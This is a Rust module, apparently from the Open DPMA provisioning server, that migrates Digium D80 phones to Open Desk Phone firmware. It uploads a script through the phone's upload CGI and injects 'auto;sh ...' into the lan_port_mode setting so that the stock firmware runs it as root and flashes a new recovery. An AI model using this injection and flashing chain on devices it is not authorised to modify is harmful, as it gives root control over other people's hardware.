//! Migrates a D80 from the stock firmware to Open Desk Phone.
//!
//! The stock firmware only installs packages signed by Digium, and so does its recovery.  Open
//! Desk Phone's recovery does not check signatures, so the migration replaces the recovery, and
//! has it install the package.
//!
//! During provisioning, Open DPMA detects the stock firmware (version <3) when it's installing Open
//! Desk Phone (version >=3).  When this is detected:
//! 1. Open DPMA uploads odp-migrate.sh to the phone using upload_file.cgi.  The file is a shell
//!    script followed by the recovery image and the package, both taken from the firmware.
//! 2. A configuration payload with `lan_port_mode` set to
//!    `auto;sh /data/digium/tmp/odp-migrate.sh` is sent to the phone.  The stock firmware
//!    conveniently executes this script for us.
//! 3. The script leaves the package in /cache, flashes the recovery image, and restarts the phone
//!    into the recovery, which installs the package.
//!
//! Nothing on the phone's /system is changed, so a phone whose installation fails starts the stock
//! firmware again (which restores its own recovery), and is migrated again when it next asks for
//! its configuration.
//!
//! If `d80_stock_firmware_migration` is set to `no`, Open DPMA will never attempt this migration.

use dpma_ast::bformat;
use dpma_ast::dpma_bytes::ByteSlice;
use dpma_ast::dpma_log;
use eff::EffReader;
use opendeskphone_recovery::{sig, zip};
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{IpAddr, SocketAddr, TcpStream};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant, SystemTime};

/// The only model this migration handles: its stock firmware has the
/// command injection, and it has the recovery partition that the
/// migration overwrites.
const MODEL: &[u8] = b"D80";

/// The size of the recovery partition, which the recovery image must fit.
const RECOVERY_PARTITION_SIZE: usize = 8 << 20;

/// The block size of the migration file's layout: the script is padded to
/// one block and the recovery image to whole blocks, so that the phone's
/// `dd` can take the file apart.
const BLOCK: usize = 4096;

/// The phone's web server upload endpoint.  `upload_file.cgi` saves each
/// upload under its client-supplied file name in `/data/digium/tmp/` (the
/// stock `TMPDIR`) with mode 0600; `dphonecored` can read the files there
/// because it runs as root.
const UPLOAD_PATH: &str = "/cgi-bin/upload_file.cgi";
const PAYLOAD_NAME: &str = "odp-migrate.sh";

/// The `lan_port_mode` value used in a migration document: `auto` for the
/// switch configuration, followed by the staged script, which the stock
/// config daemon executes as root.
pub fn payload_setting() -> &'static [u8] {
    b"auto;sh /data/digium/tmp/odp-migrate.sh"
}

const HTTP_PORT: u16 = 80;
const CONNECT_TIMEOUT: Duration = Duration::from_secs(3);
/// The timeout for each read and write of an upload.  The phone answers
/// only after it has copied the whole file into place.
const UPLOAD_TIMEOUT: Duration = Duration::from_secs(120);
/// If a phone's configuration is reapplied within this window, the file
/// is not uploaded again.
const STAGE_TTL: Duration = Duration::from_secs(120);

/// Everything a migration needs, built from the Open Desk Phone image in
/// the firmware package.
#[derive(Debug)]
pub struct Kit {
    /// The file the payload setting runs: the script, followed by the
    /// recovery image and the package.
    pub payload: Vec<u8>,
    /// The version the image installs (from its encrypted header).
    pub version: String,
}

/// A built kit, or the reason the kit could not be built.
type Built = Result<Arc<Kit>, String>;

/// A cache entry for the package file: its path, plus the modification
/// time and size it was read at.
type CachedKit = Option<(Vec<u8>, (Option<SystemTime>, u64), Built)>;

/// Cache of the last built kit.
static KIT: Mutex<CachedKit> = Mutex::new(None);

/// Returns the kit built from the firmware package's Open Desk Phone
/// image, or None if `d80_stock_firmware_migration` is disabled, there is no
/// D80 package, or its image cannot be used for migration.  Failures are
/// logged once per change of the file.
pub fn kit() -> Option<Arc<Kit>> {
    let general = crate::config::get();
    let package = crate::firmware::find(MODEL)?;
    if package.file.is_empty() {
        return None;
    }
    // Like `checksum_attr`, require a plain file name in the package
    // directory, not a URL or an absolute path.
    if package.file.starts_with(b"/") || package.file.contains_str("//") {
        return None;
    }
    let path = bformat!(
        "{}/{}",
        general.firmware_package_directory,
        crate::util::truncate(&package.file, 0x1000)
    );
    let path = crate::util::truncate(&path, 0x1000);
    let meta = match std::fs::metadata(crate::util::path(&path)) {
        Ok(m) => m,
        Err(e) => {
            dpma_log!(
                "Migration of a stock {}: {} cannot be read: {}",
                String::from_utf8_lossy(MODEL),
                String::from_utf8_lossy(&path),
                e
            );
            return None;
        }
    };
    let stamp = (meta.modified().ok(), meta.len());
    let mut g = KIT.lock().unwrap_or_else(|e| e.into_inner());
    match g.as_ref() {
        Some((p, s, built)) if *p == path && *s == stamp => built.clone().ok(),
        _ => {
            let bytes = std::fs::read(crate::util::path(&path));
            let built = match bytes {
                Ok(bytes) => build(&bytes).map(Arc::new),
                Err(e) => Err(e.to_string()),
            };
            if let Err(why) = &built {
                dpma_log!(
                    "Migration of a stock {}: no usable image in {}: {}",
                    String::from_utf8_lossy(MODEL),
                    String::from_utf8_lossy(&path),
                    why
                );
            }
            *g = Some((path, stamp, built.clone()));
            built.ok()
        }
    }
}

/// Builds a kit from the bytes of the firmware package's Open Desk Phone
/// image: takes the package out of the image and the recovery image out
/// of the package, and puts both after the script that installs them.
fn build(image: &[u8]) -> Result<Kit, String> {
    let mut eff = EffReader::new(image).map_err(|e| e.to_string())?;
    let header = eff.header().clone();
    if !header.model.trim().eq_ignore_ascii_case("D80") {
        return Err(format!(
            "the image is for a {}, not for a D80",
            header.model.trim()
        ));
    }
    // Only an Open Desk Phone image (version 3 and up) is installed this
    // way; the stock updater installs a stock image.
    if !is_odp_version(&header.version) {
        return Err(format!(
            "{} is not an Open Desk Phone version",
            header.version
        ));
    }
    let mut signed = Vec::new();
    eff.read_to_end(&mut signed).map_err(|e| e.to_string())?;
    // The image consists of the package followed by its signature, which
    // only the stock updater would check.
    let (package, _) = sig::split_image(&signed).map_err(|e| format!("not a D80 image: {e}"))?;

    let len = package.len() as u64;
    let mut archive = zip::Archive::open(std::io::Cursor::new(package), len)?;
    if archive
        .entry(opendeskphone_recovery::install::UPDATE_BINARY)
        .is_none()
    {
        return Err(format!(
            "the package has no {}",
            opendeskphone_recovery::install::UPDATE_BINARY
        ));
    }
    let recovery = archive.read(
        opendeskphone_recovery::RECOVERY_ENTRY,
        RECOVERY_PARTITION_SIZE,
    )?;
    if recovery.get(..8) != Some(b"ANDROID!") {
        return Err("the package's recovery image is not a boot image".into());
    }
    // The file is the script in one block, the recovery image in whole
    // blocks, then the package up to the end of the file.
    let mut recovery = recovery;
    recovery.resize(recovery.len().next_multiple_of(BLOCK), 0);
    let mut payload = payload_script(recovery.len() / BLOCK);
    if payload.len() > BLOCK {
        return Err("the migration script does not fit its block".into());
    }
    payload.resize(BLOCK, b'\n');
    payload.extend_from_slice(&recovery);
    payload.extend_from_slice(package);

    Ok(Kit {
        payload,
        version: header.version,
    })
}

/// Whether a version string (such as `3_1_0`) is an Open Desk Phone
/// version.
fn is_odp_version(version: &str) -> bool {
    let mut it = version.trim().split(['_', '.']);
    match it.next().and_then(|m| m.parse::<u32>().ok()) {
        Some(major) => major >= 3,
        None => false,
    }
}

/// Returns a kit if the phone behind this transaction should be migrated:
/// it runs stock firmware for [`MODEL`] (its user agent names a version
/// below 3), and the firmware package contains an Open Desk Phone image
/// for it.
pub fn plan(tx: &crate::session::Transaction) -> Option<Arc<Kit>> {
    if !crate::config::get().d80_stock_firmware_migration {
        return None;
    }
    // The user agent looks like "Digium D80 1_12_13": vendor, model, then
    // version.  (`phone_model` also accepts "sangoma p" as a vendor, but
    // no Sangoma phone runs this stock firmware.)
    let (vendor, rest) = tx.user_agent.split_once_str(" ")?;
    if !vendor.eq_ignore_ascii_case(b"Digium") {
        return None;
    }
    let (model, rest) = rest.split_once_str(" ")?;
    if !model.eq_ignore_ascii_case(MODEL) {
        return None;
    }
    let version = rest.split(|&c| c == b' ').next().unwrap_or(b"");
    if !is_stock_version(version) {
        return None;
    }
    kit()
}

/// Whether a version string names a stock release: stock releases are 1.x
/// and 2.x, and Open Desk Phone starts at 3.  Anything that does not
/// parse as a version is not treated as stock, so a phone is never
/// migrated on a guess.
fn is_stock_version(version: &[u8]) -> bool {
    let text = match std::str::from_utf8(version.trim_ascii()) {
        Ok(t) => t,
        Err(_) => return false,
    };
    let mut it = text.split(['_', '.']);
    match it.next().and_then(|m| m.parse::<u32>().ok()) {
        Some(major) => major < 3,
        None => false,
    }
}

/// The IP address of the phone's web server: taken from the host of the
/// response URI, or from the session's contact.  A host name is not
/// usable, since this module has no DNS resolver; a phone that is
/// reachable only by name is not migrated.
pub fn phone_ip(tx: &crate::session::Transaction) -> Option<IpAddr> {
    let contact = tx
        .session
        .as_ref()
        .map(|s| s.lock().contact.clone())
        .unwrap_or_default();
    for uri in [&tx.response_uri, &contact] {
        // The address is what follows the scheme and any user part, up to
        // the first parameter.  A response URI has no user part
        // (`pjsip:10.0.0.5:5060;transport=udp`), which `to_host_port`
        // does not split.
        let uri = dpma_proto::uri::get_in_brackets(uri);
        let (addr, _) = dpma_proto::uri::phone_utils_parse_uri(&uri);
        let (host, _) = dpma_proto::uri::split_hostport(&addr);
        let Ok(text) = std::str::from_utf8(&host) else {
            continue;
        };
        match text.trim().parse::<IpAddr>() {
            Ok(ip) => return Some(ip),
            Err(_) => continue,
        }
    }
    None
}

/// For each phone, when the kit's file was last uploaded and for which kit.
type StagedKits = Option<HashMap<Vec<u8>, (Instant, Arc<Kit>)>>;

static STAGED: Mutex<StagedKits> = Mutex::new(None);

/// Uploads the kit's file to the phone, unless it was uploaded recently
/// for the same kit.  A failed upload is not remembered, so the next
/// configuration apply tries again.
pub fn stage(mac: &[u8], ip: IpAddr, kit: &Arc<Kit>) {
    {
        let mut g = STAGED.lock().unwrap_or_else(|e| e.into_inner());
        let staged = g.get_or_insert_with(HashMap::new);
        if let Some((when, old)) = staged.get(mac) {
            if when.elapsed() < STAGE_TTL && Arc::ptr_eq(old, kit) {
                return;
            }
        }
        staged.insert(mac.to_vec(), (Instant::now(), kit.clone()));
    }
    dpma_log!(
        "Migration of {:#?}: uploading Open Desk Phone {} and its recovery to {}",
        String::from_utf8_lossy(mac),
        kit.version,
        ip
    );
    if let Err(e) = upload(ip, PAYLOAD_NAME, &kit.payload) {
        dpma_log!(
            "Migration of {:#?}: the upload failed: {}",
            String::from_utf8_lossy(mac),
            e
        );
        STAGED
            .lock()
            .unwrap_or_else(|e| e.into_inner())
            .as_mut()
            .map(|staged| staged.remove(mac));
    }
}

// ---------------------------------------------------------------------------
// The phone's web server
// ---------------------------------------------------------------------------

/// Sends one HTTP POST to the phone and returns the full reply body.
fn post(
    ip: IpAddr,
    path: &str,
    content_type: &str,
    body: &[u8],
    timeout: Duration,
) -> Result<Vec<u8>, String> {
    let mut stream = TcpStream::connect_timeout(&SocketAddr::new(ip, HTTP_PORT), CONNECT_TIMEOUT)
        .map_err(|e| format!("{}:{}: {e}", ip, HTTP_PORT))?;
    stream
        .set_read_timeout(Some(timeout))
        .and_then(|()| stream.set_write_timeout(Some(timeout)))
        .map_err(|e| e.to_string())?;
    let head = format!(
        "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Type: {}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
        path,
        ip,
        content_type,
        body.len()
    );
    stream
        .write_all(head.as_bytes())
        .and_then(|()| stream.write_all(body))
        .map_err(|e| format!("{}:{}: {e}", ip, HTTP_PORT))?;
    // Read the reply headers, then the body: exactly `Content-Length`
    // bytes if given, otherwise everything until the connection closes.
    let mut head = Vec::with_capacity(0x400);
    let mut byte = [0u8; 1];
    while !head.ends_with(b"\r\n\r\n") {
        match stream.read(&mut byte) {
            Ok(0) => break,
            Ok(_) => head.push(byte[0]),
            Err(e) => return Err(format!("{}:{}: {e}", ip, HTTP_PORT)),
        }
        if head.len() > 0x4000 {
            return Err(format!("{}:{}: the reply headers never end", ip, HTTP_PORT));
        }
    }
    let text = String::from_utf8_lossy(&head);
    let code = text
        .split_whitespace()
        .nth(1)
        .and_then(|c| c.parse::<u16>().ok())
        .ok_or_else(|| format!("{}:{}: the reply is not HTTP: {:#?}", ip, HTTP_PORT, text))?;
    if code != 200 {
        return Err(format!("{}:{}: HTTP {}", ip, HTTP_PORT, code));
    }
    let mut length = None;
    for line in text.lines() {
        match line.split_once(':') {
            Some((name, value)) if name.trim().eq_ignore_ascii_case("content-length") => {
                length = value.trim().parse::<usize>().ok();
                break;
            }
            _ => {}
        }
    }
    let mut body = Vec::new();
    match length {
        Some(length) => {
            stream
                .take(length as u64)
                .read_to_end(&mut body)
                .map_err(|e| e.to_string())?;
        }
        None => {
            stream.read_to_end(&mut body).map_err(|e| e.to_string())?;
        }
    }
    Ok(body)
}

/// Builds the body of a `multipart/form-data` upload carrying `data`
/// under `name`, the way the phone's own upload form sends it.
fn multipart(boundary: &str, name: &str, data: &[u8]) -> Vec<u8> {
    let mut body = Vec::with_capacity(data.len() + 0x180);
    body.extend_from_slice(
        format!(
            "--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{name}\"\r\nContent-Type: application/octet-stream\r\n\r\n"
        )
        .as_bytes(),
    );
    body.extend_from_slice(data);
    body.extend_from_slice(format!("\r\n--{boundary}--\r\n").as_bytes());
    body
}

/// Uploads one file to the phone, saved under its own name in
/// `/data/digium/tmp`.
fn upload(ip: IpAddr, name: &str, data: &[u8]) -> Result<(), String> {
    let boundary = "ODP-MIGRATE-BOUNDARY";
    let reply = post(
        ip,
        UPLOAD_PATH,
        &format!("multipart/form-data; boundary={boundary}"),
        &multipart(boundary, name, data),
        UPLOAD_TIMEOUT,
    )?;
    // `<status>1</status>` is the uploader's success.
    if find(&reply, b"<status>1</status>").is_none() {
        return Err(format!(
            "the phone did not take the upload ({:?})",
            String::from_utf8_lossy(&reply)
        ));
    }
    Ok(())
}

/// Finds the first occurrence of `needle` in `hay`.
fn find(hay: &[u8], needle: &[u8]) -> Option<usize> {
    hay.windows(needle.len()).position(|w| w == needle)
}

/// Builds the script at the start of the migration file, for a recovery
/// image of `recovery_blocks` blocks.  It ends with `exit`, so the shell
/// never reads the images that follow it.
///
/// The package goes to `/cache`, the only partition the Open Desk Phone
/// recovery mounts, before anything is changed.  The recovery image is
/// then written over the stock one (partition 2) and read back, and only
/// a recovery that reads back as written is started.  The file removes
/// itself, because the phone keeps the payload setting: should the
/// installation fail, the stock firmware must not run the file again
/// without the server.
fn payload_script(recovery_blocks: usize) -> Vec<u8> {
    format!(
        r#"#!/system/bin/sh
PATH=/system/bin:/sbin
TMP=/data/digium/tmp

mkdir -p /cache/recovery
dd if=$0 of=/cache/recovery/update.zip bs={BLOCK} skip={package_skip} || exit 1
dd if=$0 of=$TMP/odp-recovery.img bs={BLOCK} skip=1 count={recovery_blocks} || exit 1
dd if=$TMP/odp-recovery.img of=/dev/block/mmcblk0p2 bs={BLOCK} || exit 1
sync
dd if=/dev/block/mmcblk0p2 of=$TMP/odp-recovery.readback bs={BLOCK} count={recovery_blocks} || exit 1
cmp $TMP/odp-recovery.img $TMP/odp-recovery.readback || exit 1

echo "--update_package=/cache/recovery/update.zip" > /cache/recovery/command
rm $0 $TMP/odp-recovery.img $TMP/odp-recovery.readback
uboot_env -m bootcmd='booti mmc3 recovery'
service call power 12 i32 0 s16 "firmware_update" i32 0 || reboot recovery
exit
"#,
        package_skip = 1 + recovery_blocks,
    )
    .into_bytes()
}
